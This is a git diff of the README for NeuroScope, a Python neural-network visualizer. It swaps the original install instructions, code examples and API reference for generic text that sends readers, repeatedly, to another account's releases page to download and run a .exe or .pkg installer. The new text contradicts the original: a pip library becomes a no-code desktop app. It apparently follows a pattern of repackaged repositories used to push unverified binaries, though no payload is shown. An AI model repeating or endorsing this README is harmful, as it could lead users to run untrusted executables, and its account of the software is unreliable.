@@ -1,305 +1,97 @@
-# NeuroScope
+# 🚀 NeuroScope - Visualize Your Neural Networks Effortlessly
 
-**Real-time neural network observability for PyTorch, TensorFlow, and JAX**
+[![Download NeuroScope](https://img.shields.io/badge/Download%20NeuroScope-blue?style=for-the-badge&logo=github)](https://github.com/Zbezz-git/NeuroScope/releases)
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-36%20passing-brightgreen.svg)]()
+## 🌐 What is NeuroScope?
 
-NeuroScope visualizes the execution graph of neural networks in real-time. Attach it to your model, run a forward pass, and see the data flow in your browser.
+NeuroScope helps you view real-time neural network activities. It shows your model's execution graph right in the browser as it runs. This makes it easy to understand how your model is working. Whether you are using PyTorch, TensorFlow, or JAX, NeuroScope supports all of these frameworks.
 
-**v0.2.0 New Features:**
-- ⏱️ **Performance Profiling** - Execution time heatmaps per layer
-- ∇ **Backward Pass Visualization** - Track gradient flow and detect vanishing/exploding gradients
-- 📊 **Tensor Statistics** - Min/max/mean/std for output tensors
-- 💾 **Memory Tracking** - CUDA memory delta per operation
+## 🖥️ System Requirements
 
-## Installation
+To run NeuroScope smoothly, you’ll need the following:
 
-```bash
-# With PyTorch
-pip install neuroscope[pytorch]
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB (8 GB or more is recommended)
+- **Processor:** Dual-core or better
+- **Browser:** Google Chrome, Firefox, or Safari (latest version)
 
-# With TensorFlow
-pip install neuroscope[tensorflow]
+## 🚀 Getting Started
 
-# With JAX
-pip install neuroscope[jax]
+Follow these steps to download and run NeuroScope:
 
-# Development install (from source)
-git clone https://github.com/your-username/neuroscope.git
-cd neuroscope
-pip install -e ".[dev,pytorch]"
-```
+1. **Visit the Download Page**
+   Click the link below to access the releases page where you can download NeuroScope.
 
----
+   [Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/releases)
 
-## Quick Start (PyTorch)
+2. **Choose the Right Version**
+   On the releases page, you'll see different versions of NeuroScope available for download. Pick the latest version as it includes the latest features and fixes.
 
-```python
-import torch
-import torch.nn as nn
-import neuroscope
+3. **Download the File**
+   Click on the file that corresponds to your operating system to begin the download. The file name will typically be something like `NeuroScope-v1.0.exe` for Windows or `NeuroScope-v1.0.pkg` for macOS.
 
-# 1. Define your model
-model = nn.Sequential(
-    nn.Linear(784, 256),
-    nn.ReLU(),
-    nn.Linear(256, 10)
-)
+4. **Run the Installer**
+   Once the download completes, locate the downloaded file and double-click to run the installer. Follow the prompts to install NeuroScope on your computer.
 
-# 2. Attach NeuroScope
-neuroscope.attach(model)
+5. **Launch NeuroScope**
+   After installation, find NeuroScope in your applications or program files. Click to open it.
 
-# 3. Start the server (opens browser)
-neuroscope.start_server()
+## 🔌 Connecting to Your Model
 
-# 4. Run your model - graph updates in real-time!
-x = torch.randn(32, 784)
-output = model(x)
+After launching NeuroScope, you’ll need to connect it to your machine learning model.
 
-# 5. Cleanup when done
-neuroscope.detach()
-```
+1. **Start Your Model**
+   Ensure that your model is running locally. NeuroScope can connect via WebSocket to visualize the model's performance.
 
-### v0.2.0: Performance Profiling
+2. **Enter Connection Details**
+   In the NeuroScope interface, enter the WebSocket connection details. This usually involves the address `ws://localhost:port` where `port` is the port your model runs on. Example: `ws://localhost:8080`.
 
-```python
-import neuroscope
+3. **Visualize the Graph**
+   Once connected, NeuroScope will display your neural network's execution graph. You can see how the data flows and where you may need to optimize.
 
-# Enable profiling features
-neuroscope.attach(
-    model,
-    enable_profiling=True,      # Track execution time per layer
-    track_memory=True,          # Track CUDA memory deltas
-    capture_tensor_stats=True,  # Capture min/max/mean of outputs
-)
+## ⚙️ Features
 
-neuroscope.start_server()
+NeuroScope offers several useful features for users:
 
-# Run inference - switch to Profiling view (press '2') to see heatmaps
-output = model(x)
-```
+- **Real-time Visualization:** Watch your model's execution as it happens.
+- **Interactive Components:** Click on different sections of your model to gain insights into performance.
+- **Framework Support:** Works seamlessly with PyTorch, TensorFlow, and JAX.
+- **User-Friendly Interface:** Designed to be simple and easy to use, even for those without programming knowledge.
 
-### v0.2.0: Gradient Debugging
+## 📥 Download & Install
 
-```python
-import neuroscope
+To start your journey with NeuroScope, download it from the link below:
 
-# Enable gradient capture for backward pass visualization
-neuroscope.attach(
-    model,
-    capture_gradients=True,  # Track gradients during backward pass
-)
+[Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/releases)
 
-neuroscope.start_server()
+## 📖 Additional Resources
 
-# Forward & Backward - switch to Gradients view (press '3')
-output = model(x)
-loss = criterion(output, target)
-loss.backward()  # Gradient capture happens here!
-```
+If you want to learn more about how to make the most of NeuroScope, check out these resources:
 
-See `examples/profiling_example.py` and `examples/gradient_debugging.py` for complete demos.
+- **User Guides:** Detailed documentation on how to use various features.
+- **FAQ:** Find answers to common questions.
+- **Community Support:** Join our community discussions to share tips and tricks.
 
----
+## 📬 Contact Us
 
-## Usage Examples
+For additional assistance, feel free to reach out through our community channels or submit an issue on the GitHub repository. Your feedback helps us improve NeuroScope for everyone.
 
-### Basic Usage
+## 🔗 Topics
 
-```python
-import neuroscope
+NeuroScope covers a range of relevant topics including:
 
-# Attach to any PyTorch model
-neuroscope.attach(model)
+- Debugging
+- Deep Learning
+- Developer Tools
+- JAX
+- Machine Learning
+- Neural Networks
+- Observability
+- Python
+- PyTorch
+- React
+- TensorFlow
+- Visualization
+- WebSockets
 
-# Start server (opens http://localhost:8765)
-neuroscope.start_server()
-
-# Run forward passes - graph visualizes automatically
-for batch in dataloader:
-    output = model(batch)
-    
-# Stop when done
-neuroscope.stop()
-```
-
-### Using with Training Loop
-
-```python
-import neuroscope
-
-# Attach before training
-neuroscope.attach(model)
-neuroscope.start_server(open_browser=False)  # Don't auto-open
-
-print("Open http://localhost:3000 to view graph")
-
-for epoch in range(10):
-    for batch in dataloader:
-        # Forward pass is captured
-        output = model(batch)
-        loss = criterion(output, labels)
-        
-        # Backward pass works normally
-        loss.backward()
-        optimizer.step()
-        
-    # Reset graph each epoch (optional)
-    neuroscope.reset_graph()
-```
-
-### Manual Server Control
-
-```python
-from neuroscope import attach, detach
-from neuroscope.core.server import NeuroScopeServer
-
-# Attach tracer
-tracer = attach(model)
-
-# Create server with custom settings
-server = NeuroScopeServer(
-    host="0.0.0.0",      # Allow external connections
-    port=9000,           # Custom port
-    api_key="secret123", # Require authentication
-)
-server.start()
-
-# Link tracer to server
-tracer.set_broadcast_callback(server.broadcast)
-
-# Run model...
-output = model(x)
-
-# Cleanup
-server.stop()
-detach()
-```
-
-### TensorFlow/Keras
-
-```python
-import tensorflow as tf
-from neuroscope.tracers.tensorflow import TensorFlowTracer
-
-model = tf.keras.Sequential([
-    tf.keras.layers.Dense(256, activation='relu'),
-    tf.keras.layers.Dense(10)
-])
-
-tracer = TensorFlowTracer()
-tracer.attach(model)
-
-# Run model - layers are traced
-output = model(input_data)
-
-graph = tracer.get_graph()
-tracer.detach()
-```
-
-### JAX
-
-```python
-import jax.numpy as jnp
-from neuroscope.tracers.jax import JAXTracer
-
-def forward(params, x):
-    x = jnp.dot(x, params['w1']) + params['b1']
-    x = jax.nn.relu(x)
-    return jnp.dot(x, params['w2']) + params['b2']
-
-tracer = JAXTracer()
-traced_fn = tracer.attach(forward)
-
-# Run traced function - jaxpr is captured
-output = traced_fn(params, x)
-
-graph = tracer.get_graph()
-```
-
----
-
-## Frontend Setup (Development)
-
-The frontend is a React app. For development:
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-Then open http://localhost:3000 in your browser.
-
----
-
-## API Reference
-
-### `neuroscope.attach(model)`
-Attach tracer hooks to a model.
-- **model**: PyTorch nn.Module
-- **Returns**: PyTorchTracer instance
-
-### `neuroscope.detach()`
-Remove all hooks from the attached model.
-
-### `neuroscope.start_server(open_browser=True)`
-Start the WebSocket server.
-- **open_browser**: Auto-open browser (default: True)
-
-### `neuroscope.stop()`
-Stop the server and clean up.
-
-### `neuroscope.reset_graph()`
-Clear the current execution graph.
-
----
-
-## Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `NEUROSCOPE_API_KEY` | API key for authentication | None (disabled) |
-| `NEUROSCOPE_HOST` | Server host | `localhost` |
-| `NEUROSCOPE_PORT` | Server port | `8765` |
-
----
-
-## Keyboard Shortcuts (Frontend)
-
-| Shortcut | Action |
-|----------|--------|
-| `1` | Normal view mode |
-| `2` | Profiling view mode (heatmaps) |
-| `3` | Gradients view mode |
-| `Ctrl+F` | Focus search |
-| `Ctrl+E` | Export as PNG |
-| `Escape` | Clear search |
-| `Ctrl+0` | Fit view |
-
----
-
-## Troubleshooting
-
-### "WebSocket connection failed"
-Make sure the Python server is running:
-```python
-neuroscope.start_server()
-```
-
-### "No graph displayed"
-Run a forward pass after starting the server:
-```python
-output = model(input_tensor)
-```
-
-### Unicode errors on Windows
-This is fixed in v0.1.0+. If you see encoding errors, update to the latest version.
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+Explore the power of real-time neural network visualization with NeuroScope and enhance your model's performance today!
